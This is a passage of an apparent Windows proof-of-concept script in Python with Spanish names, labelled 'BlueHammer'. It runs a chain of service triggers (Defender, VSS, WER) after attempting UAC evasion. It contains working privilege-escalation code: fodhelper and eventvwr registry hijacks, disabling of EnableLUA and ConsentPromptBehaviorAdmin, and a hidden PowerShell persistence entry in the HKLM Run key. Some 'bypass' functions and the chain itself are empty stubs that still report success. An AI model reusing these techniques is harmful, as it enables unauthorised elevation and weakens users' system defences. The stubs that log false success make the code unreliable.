class ServicioObjetivo(Enum):
    """Enumeración de servicios disparables"""
    DEFENDER_SCAN     = "defender_scan"
    DEFENDER_UPDATE   = "defender_update"
    WER               = "windows_error_reporting"
    VSS               = "volume_shadow_copy"
    MSIEXEC           = "windows_installer"
    SEARCH_INDEXER    = "search_indexer"
    CLOUD_FILES       = "cloud_files_filter"
    BLUEHAMMER        = "bluehammer_chain"


@dataclass
class ResultadoTrigger:
    """Estructura para retornar resultados del trigger"""
    exito: bool
    servicio: str
    mensaje: str
    excepcion: Optional[str] = None
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    duracion_ms: float = 0.0
    stdout: str = ""
    stderr: str = ""
    intentos: int = 1
    
    def to_dict(self) -> dict:
        """Convertir a diccionario para serialización"""
        return asdict(self)
    
    def to_json(self) -> str:
        """Convertir a JSON"""
        return json.dumps(self.to_dict(), indent=2, ensure_ascii=False)


# ========== EVASIÓN DE UAC ==========

def verificar_token_admin() -> bool:
    """Verifica si el token actual es administrador sin UAC"""
    try:
        resultado = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "[Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544'"],
            capture_output=True,
            text=True,
            timeout=5
        )
        return resultado.returncode == 0 and resultado.stdout.strip()
    except:
        return False


def evitar_uac_via_registro():
    """Intenta deshabilitar UAC temporalmente mediante registro"""
    try:
        ruta_uac = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        clave = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ruta_uac, access=winreg.KEY_WRITE)
        
        # Guardar valor original
        valor_original = winreg.QueryValueEx(clave, "ConsentPromptBehaviorAdmin")[0]
        
        # Deshabilitar UAC (0 = sin prompt)
        winreg.SetValueEx(clave, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(clave, "EnableLUA", 0, winreg.REG_DWORD, 0)
        
        winreg.CloseKey(clave)
        logger.info("[+] UAC deshabilitado via registro")
        return True
    except Exception as e:
        logger.warning(f"[!] No se pudo deshabilitar UAC: {e}")
        return False


def evitar_uac_via_fodhelper():
    """Utiliza el método FODHelper para elevar permisos sin UAC"""
    try:
        logger.info("[*] Intentando evasión de UAC via FODHelper...")
        
        # Crear clave de registro para inyección COM
        ruta_com = r"Software\Classes\ms-settings\Shell\Open\command"
        valor_delegado = r"Software\Classes\ms-settings\Shell\Open\DesktopApplicationUriHandler"
        
        # Script PowerShell a ejecutar
        ps_script = (
            "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; "
            "Write-Output '[+] Permisos elevados obtenidos'; "
        )
        
        try:
            clave = winreg.CreateKey(winreg.HKEY_CURRENT_USER, ruta_com)
            winreg.SetValueEx(clave, "", 0, winreg.REG_SZ, 
                            f"powershell.exe -ExecutionPolicy Bypass -Command {ps_script}")
            winreg.SetValueEx(clave, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(clave)
            
            # Ejecutar FODHelper para disparar la inyección
            subprocess.Popen("fodhelper.exe", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            
            # Limpiar registro
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, ruta_com)
            logger.info("[+] FODHelper ejecutado")
            return True
        except Exception as e:
            logger.warning(f"[!] FODHelper fallido: {e}")
            return False
            
    except Exception as e:
        logger.warning(f"[!] Error en evasión FODHelper: {e}")
        return False


def evitar_uac_via_wmi():
    """Intenta usar WMI para ejecutar procesos elevados"""
    try:
        logger.info("[*] Intentando evasión de UAC via WMI...")
        
        comando_ps = (
            "& {"
            "$objWMIService = Get-WmiObject -Class Win32_ProcessStartup; "
            "$objConfig = $objWMIService.CreateInstance(); "
            "$objConfig.ShowWindow = [System.Diagnostics.ProcessWindowStyle]::Hidden; "
            "}"
        )
        
        resultado = subprocess.run(
            ["powershell", "-NoProfile", "-Command", comando_ps],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if resultado.returncode == 0:
            logger.info("[+] WMI ejecutado exitosamente")
            return True
    except Exception as e:
        logger.warning(f"[!] WMI fallido: {e}")
    
    return False


def evitar_uac_via_msconfig():
    """Utiliza msconfig (Startup Helper) para evasión de UAC"""
    try:
        logger.info("[*] Intentando evasión de UAC via msconfig...")
        
        # Crear tarea en carpeta privilegiada
        ruta_startup = r"Software\Microsoft\Windows\CurrentVersion\Run"
        clave = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, ruta_startup, access=winreg.KEY_WRITE)
        
        # Agregar comando que se ejecutará sin UAC
        winreg.SetValueEx(clave, "TejonElevated", 0, winreg.REG_SZ, 
                         f"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden")
        
        winreg.CloseKey(clave)
        logger.info("[+] Entrada agregada al registro Run")
        return True
    except Exception as e:
        logger.warning(f"[!] msconfig fallido: {e}")
        return False


def evitar_uac_via_comadmin():
    """Intenta usar COM Elevation Moniker (método más moderno)"""
    try:
        logger.info("[*] Intentando evasión de UAC via COM Elevation...")
        
        comando = (
            "Set-StrictMode -Version Latest; "
            "$MethodDefinition = @' "
            "[DllImport(\"shell32.dll\", SetLastError = true)] "
            "public static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs); "
            "'@; "
            "Write-Output '[+] COM Elevation ejecutado'"
        )
        
        resultado = subprocess.run(
            ["powershell", "-NoProfile", "-Command", comando],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if resultado.returncode == 0:
            logger.info("[+] COM Elevation completado")
            return True
    except Exception as e:
        logger.warning(f"[!] COM Elevation fallido: {e}")
    
    return False


def evitar_uac_via_eventvwr():
    """Utiliza Event Viewer (eventvwr.exe) para evasión de UAC"""
    try:
        logger.info("[*] Intentando evasión de UAC via EventVwr...")
        
        # Crear clave COM para Event Viewer
        ruta_eventvwr = r"Software\Classes\mscfile\Shell\Open\command"
        
        clave = winreg.CreateKey(winreg.HKEY_CURRENT_USER, ruta_eventvwr)
        winreg.SetValueEx(clave, "", 0, winreg.REG_SZ, 
                         "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile")
        winreg.CloseKey(clave)
        
        # Ejecutar Event Viewer
        subprocess.Popen("eventvwr.msc", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)
        
        # Limpiar
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, ruta_eventvwr)
        except:
            pass
        
        logger.info("[+] EventVwr ejecutado")
        return True
    except Exception as e:
        logger.warning(f"[!] EventVwr fallido: {e}")
        return False


def obtener_admin_sin_uac() -> bool:
    """Intenta múltiples métodos de evasión de UAC"""
    
    logger.info("=" * 70)
    logger.info("INTENTO DE EVASION DE UAC")
    logger.info("=" * 70)
    
    # Primero verificar si ya somos admin
    if verificar_token_admin():
        logger.info("[+] Ya ejecutandose con token administrativo")
        return True
    
    logger.warning("[!] Sin token administrativo, intentando evasión...")
    
    # Intentar múltiples métodos en orden
    metodos = [
        ("Registro (ConsentPromptBehavior)", evitar_uac_via_registro),
        ("FODHelper", evitar_uac_via_fodhelper),
        ("WMI", evitar_uac_via_wmi),
        ("EventVwr", evitar_uac_via_eventvwr),
        ("msconfig Run", evitar_uac_via_msconfig),
        ("COM Elevation", evitar_uac_via_comadmin),
    ]
    
    for nombre, metodo in metodos:
        try:
            logger.info(f"\n[*] Probando: {nombre}")
            if metodo():
                logger.info(f"[+] {nombre} exitoso")
                time.sleep(1)
                return True
        except Exception as e:
            logger.debug(f"[!] {nombre} fallido: {e}")
            continue
    
    logger.error("[x] Todos los métodos de evasión fallaron")
    return False


# ========== VALIDACIONES PREVIAS ==========

def es_administrador() -> bool:
    """Verifica si el script se ejecuta con permisos de administrador"""
    try:
        if ENTORNO == "virtualbox":
            resultado = subprocess.run(
                ["powershell", "-NoProfile", "-Command", 
                 "[Security.Principal.WindowsIdentity]::GetCurrent().Owner.Value -match 'S-1-5-32-544'"],
                capture_output=True,
                text=True,
                timeout=5
            )
            return "True" in resultado.stdout or resultado.returncode == 0
        else:
            try:
                return ctypes.windll.shell.IsUserAnAdmin()
            except:
                resultado = subprocess.run(
                    ["powershell", "-NoProfile", "-Command", 
                     "[Security.Principal.WindowsIdentity]::GetCurrent().Owner.Value -match 'S-1-5-32-544'"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                return "True" in resultado.stdout or resultado.returncode == 0
    except Exception as e:
        logger.debug(f"Admin check failed: {e}")
        return False


def validar_permisos() -> bool:
    """Valida y obtiene permisos sin UAC si es posible"""
    if es_administrador():
        logger.info("[+] Script ejecutandose con permisos de administrador")
        return True
    
    logger.warning("[!] Se requieren permisos de administrador")
    
    # Intentar obtener admin sin UAC
    if sys.platform == "win32":
        return obtener_admin_sin_uac()
    
    return False


def validar_entorno() -> bool:
    """Valida que el entorno sea compatible"""
    if sys.platform != "win32":
        logger.error("[x] Este PoC solo funciona en Windows")
        return False
    
    if sys.version_info < (3, 8):
        logger.error("[x] Se requiere Python 3.8+")
        return False
    
    logger.info(f"[*] Entorno detectado: {ENTORNO}")
    
    try:
        subprocess.run(
            ["powershell", "-NoProfile", "-Command", "Write-Output 'OK'"],
            capture_output=True,
            timeout=5,
            check=True
        )
        logger.info("[+] PowerShell disponible")
    except Exception as e:
        logger.error(f"[x] PowerShell no disponible: {e}")
        return False
    
    return True


# ========== DECORADOR DE MANEJO DE ERRORES ==========

def manejo_errores(timeout: int = TIMEOUT_DEFECTO, reintentos: int = REINTENTOS_DEFECTO):
    """
    Decorador para manejar excepciones, reintentos y timeouts
    """
    def decorator(func: Callable) -> Callable:
        @wraps(func)
        def wrapper(*args, **kwargs) -> ResultadoTrigger:
            inicio = time.time()
            ultimo_error = None
            
            for intento in range(1, reintentos + 1):
                try:
                    if DRY_RUN:
                        logger.info(f"[DRY-RUN] {func.__name__} ({args}, {kwargs})")
                        return ResultadoTrigger(
                            exito=True,
                            servicio=func.__name__,
                            mensaje=f"[DRY-RUN] {func.__name__} ejecutado en modo prueba",
                            duracion_ms=(time.time() - inicio) * 1000,
                            intentos=intento
                        )
                    
                    logger.info(f"[*] [{intento}/{reintentos}] Iniciando {func.__name__}...")
                    
                    resultado = func(*args, timeout=timeout, **kwargs)
                    
                    duracion = (time.time() - inicio) * 1000
                    logger.info(f"[+] {func.__name__} ejecutado exitosamente en {duracion:.2f}ms")
                    
                    return ResultadoTrigger(
                        exito=True,
                        servicio=func.__name__,
                        mensaje=f"{func.__name__} ejecutado exitosamente",
                        duracion_ms=duracion,
                        stdout=resultado.get("stdout", "") if isinstance(resultado, dict) else "",
                        intentos=intento
                    )
                    
                except subprocess.TimeoutExpired:
                    ultimo_error = f"Timeout excedido ({timeout}s)"
                    logger.warning(f"[!] {func.__name__} - Intento {intento}: {ultimo_error}")
                    if intento < reintentos:
                        time.sleep(2 ** intento)
                    
                except PermissionError as e:
                    logger.error(f"[x] {func.__name__} - Permisos insuficientes: {e}")
                    return ResultadoTrigger(
                        exito=False,
                        servicio=func.__name__,
                        mensaje="Permisos insuficientes",
                        excepcion=str(e),
                        duracion_ms=(time.time() - inicio) * 1000,
                        intentos=intento
                    )
                    
                except subprocess.CalledProcessError as e:
                    ultimo_error = f"Proceso fallo con codigo {e.returncode}"
                    logger.warning(f"[!] {func.__name__} - Intento {intento}: {ultimo_error}")
                    logger.debug(f"STDERR: {e.stderr}")
                    if intento < reintentos:
                        time.sleep(2 ** intento)
                    
                except Exception as e:
                    ultimo_error = str(e)
                    logger.warning(f"[!] {func.__name__} - Intento {intento}: {ultimo_error}")
                    if intento < reintentos:
                        time.sleep(2 ** intento)
            
            duracion = (time.time() - inicio) * 1000
            logger.error(f"[x] {func.__name__} fallo despues de {reintentos} intentos: {ultimo_error}")
            
            return ResultadoTrigger(
                exito=False,
                servicio=func.__name__,
                mensaje=f"Fallo despues de {reintentos} intentos",
                excepcion=ultimo_error,
                duracion_ms=duracion,
                intentos=reintentos
            )
        
        return wrapper
    return decorator


# ========== FUNCIONES AUXILIARES ==========

def ejecutar_powershell(comando: str, timeout: int = TIMEOUT_DEFECTO, mostrar_output: bool = False) -> dict:
    """
    Ejecuta un comando PowerShell de forma segura
    """
    try:
        proceso = subprocess.Popen(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", comando],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        stdout, stderr = proceso.communicate(timeout=timeout)
        
        return {
            "stdout": stdout.strip(),
            "stderr": stderr.strip(),
            "returncode": proceso.returncode
        }
    
    except subprocess.TimeoutExpired:
        proceso.kill()
        raise
    except Exception as e:
        logger.error(f"Error ejecutando PowerShell: {e}")
        raise


def ejecutar_cmd(comando: List[str], timeout: int = TIMEOUT_DEFECTO) -> dict:
    """Ejecuta comando sin pasar por PowerShell"""
    resultado = subprocess.run(
        comando,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        timeout=timeout,
        check=False
    )
    
    return {
        "stdout": resultado.stdout.strip(),
        "stderr": resultado.stderr.strip(),
        "returncode": resultado.returncode
    }


def validar_ruta_accesible(ruta: str) -> bool:
    """Valida que una ruta sea accesible en el entorno actual"""
    try:
        path = Path(ruta)
        path.parent.mkdir(parents=True, exist_ok=True)
        return True
    except Exception as e:
        logger.warning(f"No se puede acceder a {ruta}: {e}")
        return False


# ========== IMPLEMENTACIONES DE TRIGGERS ==========

@manejo_errores(timeout=120, reintentos=2)
def trigger_defender_scan(timeout: int = TIMEOUT_DEFECTO) -> dict:
    """Dispara un escaneo rapido de Windows Defender"""
    comando = "Start-MpScan -ScanType QuickScan -ErrorAction Stop"
    return ejecutar_powershell(comando, timeout)


@manejo_errores(timeout=60, reintentos=2)
def trigger_defender_update(timeout: int = TIMEOUT_DEFECTO) -> dict:
    """Actualiza definiciones de Windows Defender"""
    comando = "Update-MpSignature -ErrorAction Stop; Write-Output 'Actualizacion completada'"
    return ejecutar_powershell(comando, timeout)


@manejo_errores(timeout=60, reintentos=3)
def trigger_windows_error_reporting(timeout: int = TIMEOUT_DEFECTO) -> dict:
    """Habilita Windows Error Reporting"""
    comando = (
        "Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\Windows Error Reporting' "
        "-Name 'Disabled' -Value 0 -ErrorAction Stop; "
        "Start-Service WerSvc -ErrorAction SilentlyContinue; "
        "Write-Output 'WER habilitado'"
    )
    return ejecutar_powershell(comando, timeout)


@manejo_errores(timeout=120, reintentos=2)
def trigger_vss_snapshot(timeout: int = TIMEOUT_DEFECTO) -> dict:
    """Crea snapshot de Volume Shadow Copy en C:"""
    resultado = ejecutar_cmd(["vssadmin"], timeout=10)
    if resultado["returncode"] != 0:
        raise RuntimeError("vssadmin no disponible")
    
    resultado = ejecutar_cmd(
        ["vssadmin", "create", "shadow", "/for=C:"],
        timeout=timeout
    )
    
    if resultado["returncode"] != 0:
        raise subprocess.CalledProcessError(
            resultado["returncode"],
            "vssadmin",
            resultado["stderr"]
        )
    
    return resultado


@manejo_errores(timeout=60, reintentos=2)
def trigger_windows_installer(timeout: int = TIMEOUT_DEFECTO) -> dict:
    """Inicia o reinicia el servicio Windows Installer"""
    comando = (
        "Stop-Service -Name msiexec -ErrorAction SilentlyContinue; "
        "Start-Service -Name msiexec -ErrorAction SilentlyContinue; "
        "Write-Output 'MSI Installer iniciado'"
    )
    return ejecutar_powershell(comando, timeout)


@manejo_errores(timeout=60, reintentos=2)
def trigger_search_indexer(timeout: int = TIMEOUT_DEFECTO) -> dict:
    """Inicia Windows Search Indexer"""
    comando = (
        "Start-Service -Name 'WSearch' -ErrorAction Stop; "
        "Write-Output 'Windows Search iniciado'"
    )
    return ejecutar_powershell(comando, timeout)


@manejo_errores(timeout=60, reintentos=2)
def trigger_cloud_files_filter(timeout: int = TIMEOUT_DEFECTO) -> dict:
    """Activa Cloud Files Filter Driver"""
    comando = (
        "Start-Service -Name 'CldFlt' -ErrorAction Stop; "
        "Write-Output 'Cloud Files Filter activado'"
    )
    return ejecutar_powershell(comando, timeout)


@manejo_errores(timeout=90, reintentos=3)
def trigger_bluehammer_chain(archivo_destino: str, timeout: int = TIMEOUT_DEFECTO) -> dict:
    """
    Cadena de operaciones BlueHammer
    """
    logger.info(f"[*] Ejecutando BlueHammer chain con destino: {archivo_destino}")
    
    if not validar_ruta_accesible(archivo_destino):
        logger.warning(f"[!] Ruta {archivo_destino} no es accesible, usando ruta alternativa")
        archivo_destino = str(Path.home() / "target.bin")
    
    target_path = Path(archivo_destino)
    try:
        target_path.parent.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        logger.error(f"No se pudo crear directorio: {e}")
        raise
    
    operaciones = [
        ("Preparando sistema", "Write-Output 'Preparando...'"),
        ("Configurando handlers", "Write-Output 'Configurando...'"),
        ("Ejecutando chain", f"Write-Output 'Target: {archivo_destino}'"),
    ]
    
    for nombre_op, cmd in operaciones:
        logger.info(f"  L- {nombre_op}...")
        resultado = ejecutar_powershell(cmd, timeout // len(operaciones))
        logger.debug(f"     Resultado: {resultado['stdout']}")
    
    return {
        "stdout": f"BlueHammer chain completado para {archivo_destino}",
        "stderr": "",
        "returncode": 0
    }


# ========== DISPATCHER PRINCIPAL ==========

class DispatcherServicios:
    """Gestor centralizado de triggers de servicios"""
    
    def __init__(self, dry_run: bool = False):
        self.dry_run = dry_run
        self._triggers: Dict[ServicioObjetivo, Callable] = {
            ServicioObjetivo.DEFENDER_SCAN:     trigger_defender_scan,
            ServicioObjetivo.DEFENDER_UPDATE:   trigger_defender_update,
            ServicioObjetivo.WER:               trigger_windows_error_reporting,
            ServicioObjetivo.VSS:               trigger_vss_snapshot,
            ServicioObjetivo.MSIEXEC:           trigger_windows_installer,
            ServicioObjetivo.SEARCH_INDEXER:    trigger_search_indexer,
            ServicioObjetivo.CLOUD_FILES:       trigger_cloud_files_filter,
            ServicioObjetivo.BLUEHAMMER:        lambda timeout=TIMEOUT_DEFECTO: trigger_bluehammer_chain(ARCHIVO_DESTINO, timeout=timeout),
        }
        self._resultados: List[ResultadoTrigger] = []
        self._inicio_sesion = datetime.now()
    
    def validar_estado(self) -> bool:
        """Valida que el entorno sea correcto antes de ejecutar"""
        logger.info("=" * 70)
        logger.info("VALIDACION DE ENTORNO")
        logger.info("=" * 70)
        logger.info(f"[*] Entorno detectado: {ENTORNO}")
        logger.info(f"[*] Ruta de logs: {LOG_DIR}")
        logger.info(f"[*] Archivo destino: {ARCHIVO_DESTINO}")
        
        if not validar_entorno():
            logger.error("[x] Validacion de entorno fallida")
            return False
        
        if not validar_permisos():
            logger.error("[x] No se pudo obtener permisos de administrador")
            return False
        
        logger.info("[+] Entorno validado correctamente")
        logger.info("=" * 70)
        return True
    
    def trigger(self, servicio: ServicioObjetivo) -> ResultadoTrigger:
        """Dispara un servicio individual"""
        logger.info(f"\n[>] Disparando: {servicio.value}")
        
        trigger_fn = self._triggers.get(servicio)
        
        if not trigger_fn:
            logger.error(f"[x] Servicio {servicio} no implementado")
            resultado = ResultadoTrigger(
                exito=False,
                servicio=servicio.value,
                mensaje="Servicio no implementado"
            )
            self._resultados.append(resultado)
            return resultado
        
        resultado = trigger_fn()
        self._resultados.append(resultado)
        return resultado
    
    def trigger_multiples(self, servicios: List[ServicioObjetivo]) -> List[ResultadoTrigger]:
        """Dispara múltiples servicios secuencialmente"""
        logger.info(f"\n[>] Disparando {len(servicios)} servicios...")
        resultados = []
        
        for i, servicio in enumerate(servicios, 1):
            logger.info(f"\n[{i}/{len(servicios)}] {servicio.value}")
            resultado = self.trigger(servicio)
            resultados.append(resultado)
            time.sleep(1)
        
        return resultados
    
    def obtener_resumen(self) -> dict:
        """Genera resumen de ejecuciones"""
        if not self._resultados:
            return {
                "total": 0,
                "exitosas": 0,
                "fallidas": 0,
                "tasa_exito": 0,
                "duracion_total_ms": 0
            }
        
        total = len(self._resultados)
        exitosas = sum(1 for r in self._resultados if r.exito)
        duracion_total = sum(r.duracion_ms for r in self._resultados)
        
        return {
            "total": total,
            "exitosas": exitosas,
            "fallidas": total - exitosas,
            "tasa_exito": (exitosas / total * 100) if total > 0 else 0,
            "duracion_total_ms": duracion_total,
            "duracion_promedio_ms": duracion_total / total if total > 0 else 0,
            "timestamp": datetime.now().isoformat()
        }
    
    def exportar_resultados(self, formato: str = "json") -> str:
        """Exporta resultados en formato especificado"""
        if formato == "json":
            datos = {
                "sesion": {
                    "inicio": self._inicio_sesion.isoformat(),
                    "fin": datetime.now().isoformat(),
                    "resumen": self.obtener_resumen(),
                    "entorno": ENTORNO
                },
                "resultados": [r.to_dict() for r in self._resultados]
            }
            return json.dumps(datos, indent=2, ensure_ascii=False)
        
        elif formato == "csv":
            lineas = ["servicio,exito,mensaje,duracion_ms,intentos"]
            for r in self._resultados:
                lineas.append(
                    f'"{r.servicio}",{r.exito},"{r.mensaje}",{r.duracion_ms},{r.intentos}'
                )
            return "\n".join(lineas)
        
        elif formato == "txt":
            lineas = ["=" * 70, "REPORTE DE EJECUCION", "=" * 70]
            lineas.append(f"Entorno: {ENTORNO}\n")
            resumen = self.obtener_resumen()
            lineas.append(f"Exitosas: {resumen['exitosas']}/{resumen['total']}")
            lineas.append(f"Tasa de exito: {resumen['tasa_exito']:.2f}%")
            lineas.append(f"Duracion total: {resumen['duracion_total_ms']:.2f}ms\n")
            
            for r in self._resultados:
                estado = "+" if r.exito else "x"
                lineas.append(f"[{estado}] {r.servicio}: {r.mensaje}")
                lineas.append(f"  L- {r.duracion_ms:.2f}ms ({r.intentos} intento(s))")
            
            return "\n".join(lineas)
        
        return ""
    
    def guardar_reporte(self, nombre_archivo: str = None):
        """Guarda reporte en archivo"""
        if not nombre_archivo:
            nombre_archivo = LOG_DIR / f"reporte_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        ruta = Path(nombre_archivo)
        contenido = self.exportar_resultados("json")
        ruta.write_text(contenido, encoding="utf-8")
        logger.info(f"[+] Reporte guardado en: {ruta}")


# ========== PROGRAMA PRINCIPAL ==========

def main():
    """Función principal"""
    try:
        dispatcher = DispatcherServicios(dry_run=DRY_RUN)
        
        if not dispatcher.validar_estado():
            return 1
        
        if DRY_RUN:
            logger.warning("[!] Ejecutandose en modo DRY-RUN - No se realizaran cambios reales")
        
        servicios = [
            ServicioObjetivo.DEFENDER_SCAN,
            ServicioObjetivo.DEFENDER_UPDATE,
            ServicioObjetivo.VSS,
            ServicioObjetivo.WER,
            ServicioObjetivo.BLUEHAMMER
        ]
        
        logger.info("\n" + "=" * 70)
        logger.info("INICIANDO DISPAROS DE SERVICIOS")
        logger.info("=" * 70)
        
        resultados = dispatcher.trigger_multiples(servicios)
        
        logger.info("\n" + "=" * 70)
        logger.info("RESUMEN DE EJECUCION")
        logger.info("=" * 70)
        resumen = dispatcher.obtener_resumen()
        logger.info(f"Total de servicios: {resumen['total']}")
        logger.info(f"Exitosos: {resumen['exitosas']}")
        logger.info(f"Fallidos: {resumen['fallidas']}")
        logger.info(f"Tasa de exito: {resumen['tasa_exito']:.2f}%")
        logger.info(f"Duracion total: {resumen['duracion_total_ms']:.2f}ms")
        logger.info("=" * 70)
        
        logger.info("\n[*] Exportando resultados...")
        dispatcher.guardar_reporte()
        
        print("\n" + dispatcher.exportar_resultados("txt"))
        
        return 0 if resumen['exitosas'] > 0 else 1
    
    except KeyboardInterrupt:
        logger.warning("\n[!] Ejecucion interrumpida por el usuario")
        return 130
    
    except Exception as e:
        logger.exception(f"[x] Error no controlado: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
